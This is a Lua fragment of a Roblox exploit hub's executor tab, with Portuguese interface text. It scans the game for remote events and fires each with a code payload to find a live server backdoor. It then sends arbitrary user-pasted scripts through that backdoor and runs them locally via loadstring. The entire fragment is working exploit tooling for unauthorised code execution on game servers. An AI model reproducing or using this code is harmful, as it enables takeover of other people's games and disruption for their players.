-- ABA 1: SCANNER / EXECUTOR
-- ==========================================
local tabExec = win:CreateTab({Name = "Executor", Icon = "terminal"})
local statusLabel = tabExec:CreateLabel({Name = "Status: Aguardando INJECT..."})

tabExec:CreateButton({
    Name = "INJECT (Scan Remotes)",
    Icon = "search",
    Callback = function()
        statusLabel:Set("Status: Escaneando remotes...")
        local remotes = {}
        local seen = {}
        local function scan(obj)
            if not obj or seen[obj] then return end
            seen[obj] = true
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remotes, obj)
            end
            for _, c in ipairs(obj:GetChildren()) do pcall(scan, c) end
        end
        pcall(scan, ReplicatedStorage)
        pcall(scan, LP)
        pcall(scan, workspace)
        
        if #remotes == 0 then
            statusLabel:Set("Status: Nenhum remote encontrado.")
            win:Notify({Title = "Falha", Content = "Nenhum remote encontrado.", Duration = 5})
            return
        end

        local codeMap = {}
        local function randomName()
            local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            local out = {}
            for i = 1, 16 do
                local n = math.random(1, #chars)
                out[i] = chars:sub(n, n)
            end
            return table.concat(out)
        end

        for _, r in ipairs(remotes) do
            local code = randomName()
            codeMap[code] = r
            local payload = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
            pcall(function()
                if r:IsA("RemoteEvent") then r:FireServer(payload) else r:InvokeServer(payload) end
            end)
            task.wait()
        end

        local found = false
        for cycle = 1, 100 do
            for code, remote in pairs(codeMap) do
                if workspace:FindFirstChild(code) then
                    found = true
                    backdoorRemote = remote
                    pcall(function() workspace[code]:Destroy() end)
                    statusLabel:Set("Status: Backdoor Encontrada! (" .. remote.Name .. ")")
                    win:Notify({Title = "Sucesso", Content = "Backdoor viva em: " .. remote:GetFullName(), Duration = 5})
                    break
                end
            end
            if found then break end
            task.wait(0.1)
        end

        if not found then
            statusLabel:Set("Status: Nenhuma backdoor respondeu.")
            win:Notify({Title = "Falha", Content = "Nenhuma backdoor viva encontrada.", Duration = 5})
        end
    end
})

local textBox = tabExec:CreateTextArea({
    Name = "Script Code",
    PlaceholderText = "-- Cole seu script Lua aqui (Executado localmente ou via backdoor)",
    Height = 150,
    MaxLength = 0
})

tabExec:CreateButton({
    Name = "EXECUTE",
    Icon = "play",
    Callback = function()
        local src = textBox:Get()
        if src == "" or src == nil then
            win:Notify({Title = "Aviso", Content = "A textbox está vazia.", Duration = 3})
            return
        end
        if backdoorRemote then
            pcall(function()
                if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(src) else backdoorRemote:InvokeServer(src) end
            end)
        end
        local func, err = loadstring(src, "=MI_HUB")
        if not func then
            win:Notify({Title = "Erro (Loadstring)", Content = tostring(err), Duration = 5})
            return
        end
        if setfenv then pcall(setfenv, func, getfenv(0)) end
        local ok, runErr = pcall(func)
        if ok then
            win:Notify({Title = "Executado", Content = "Script rodou localmente.", Duration = 3})
        else
            win:Notify({Title = "Erro (Runtime)", Content = tostring(runErr), Duration = 5})
        end
    end
})

